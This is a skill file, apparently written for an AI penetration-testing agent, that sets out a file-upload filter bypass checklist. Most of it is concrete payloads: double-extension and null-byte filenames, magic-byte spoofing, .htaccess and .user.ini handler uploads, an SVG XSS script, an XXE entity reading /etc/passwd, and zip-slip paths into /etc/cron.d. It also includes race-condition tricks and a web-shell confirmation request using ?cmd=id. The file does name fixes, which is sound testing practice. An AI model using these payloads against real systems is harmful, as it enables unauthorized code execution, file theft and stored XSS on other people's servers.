---
name: file-upload-bypass
description: Concrete upload-filter bypass matrix — extension tricks, MIME/magic-byte spoofing, config-file uploads, polyglots, zip-slip, and fetch-back verification
---

# File Upload Bypass

Upload filters fail in predictable ways. This is the bypass matrix — work it systematically, then verify by fetching the file back. `insecure_file_uploads` covers the full pipeline view; this file is the payload-forward checklist for getting an executable/active file past the filter and proving it.

## Extension Bypasses

| Technique | Payload | Beats |
|---|---|---|
| Double extension | `shell.php.txt`, `shell.php.jpg` | checks that read only the last extension |
| Null byte | `shell.php%00.jpg`, `shell.asp%00.gif` | legacy stacks truncating at `%00` |
| Trailing dot/space | `shell.php.`, `shell.php ` | allowlists that don't normalize |
| Case variation | `shell.PhP`, `shell.pHp5` | case-sensitive deny-lists on case-insensitive filesystems |
| Alt executable exts | `.phtml .pht .phar .php3-7 .inc .cgi .pl .asp .aspx .jsp .jspx .war` | narrow deny-lists blocking only `.php`/`.asp` |
| No extension / dotfile | `shell`, `.htaccess` | validators requiring an extension |
| Allowlist confusion | `shell;.jpg`, `shell..jpg`, `shell.jpg/`, `shell....//shell.php` | parsers disagreeing on where the extension ends |
| Path injection | `../../shell.php`, `..%2f..%2fshell.php` | filename used as a path component |

## Content Bypasses

- **Content-Type spoof**: send `Content-Type: image/jpeg` with a PHP body — beats filters trusting the multipart header.
- **Magic bytes**: prepend `GIF89a;` (or a real JPEG/PNG header) before `<?php … ?>` — beats `getimagesize()`/magic-byte checks that read only the header.
- **Image polyglot**: valid GIF89a header + PHP payload in comment/metadata — survives re-encoding-light pipelines; test whether the served file keeps the payload bytes.
- **MIME sniffing**: upload `shell.html` as `text/plain` — if the server omits `X-Content-Type-Options: nosniff`, browsers sniff it back to HTML and execute.

## Config & Handler Uploads

- **`.htaccess`** (Apache): `AddType application/x-httpd-php .xyz` → then upload `shell.xyz`.
- **`.user.ini`** (PHP-FPM): `auto_prepend_file=evil.jpg` → upload payload as `evil.jpg`.
- **`web.config`** (IIS): handler mappings enabling script execution in the upload dir.
- Upload these *into* the writable directory; they execute when any file in that dir is requested.

## Active-Content Payloads

- **SVG → XSS**: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>` — fires if served as `image/svg+xml` or `text/html` inline.
- **XXE in docx/svg**: XML-bearing formats parsed server-side — `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>` in SVG or `word/document.xml`.
- **HTML/JS upload**: stored XSS when served inline; check `Content-Disposition` and `nosniff` on retrieval.

## Archive & Path Payloads

- **Zip-slip**: archive members named `../../etc/cron.d/evil` or `..%2f..%2f` — escapes the extraction dir on unpack.
- **Symlink-in-archive**: member symlink → `ln -s /etc/passwd link` then a second member writing through it.
- **Nested archives**: zip-in-zip to exhaust recursion limits or bypass single-level scanning.

## Race Conditions

- **Temp-name race**: file lands at a predictable temp path (`/tmp/phpXXXXXX`, `uploads/tmp_<name>`) before validation deletes it — request it in a tight parallel loop during upload.
- **Validation race**: file is served before AV/CDR completes — fetch immediately post-upload, repeatedly.

## Verification — Fetch It Back

An accepted upload is not a finding. Prove it:

1. **Locate the served URL** — response body, predictable path (`/uploads/<name>`), or directory listing.
2. **Fetch it back** — `curl -skI <url>`: confirm `200`, the `Content-Type` it serves as, `Content-Disposition`, and `X-Content-Type-Options`.
3. **Execute/confirm**:
   - Shell: `GET /uploads/shell.php?cmd=id` → `uid=` in the body.
   - SVG/HTML: load in browser, confirm script execution.
   - Config upload: request any file in that dir, confirm the handler applied.
   - Zip-slip: fetch the escaped target path or observe the written artifact.
4. **Reachability counts**: a file stored but never served, or always served `attachment` + `nosniff`, is not exploitable — downgrade accordingly.

## False Positives

- Upload accepted but stored outside webroot with no retrieval path.
- Always served `Content-Disposition: attachment` with `nosniff` — no execution context.
- Re-encoding pipeline strips the payload bytes (verify the *served* file, not the uploaded one).
- Extraction sandboxed — traversal members dropped or jailed.

## Rules

1. Work the matrix in order — extension tricks are cheapest, races are last.
2. The served `Content-Type`/`Content-Disposition` decides browser behavior — capture them every time.
3. Verify the *served* bytes, not the uploaded ones — pipelines transform.
4. When execution fails, fall back to stored XSS or header-driven script execution before giving up.
5. Record which bypass family worked — it tells the fix (allowlist + content inspection + serve-safe) precisely.
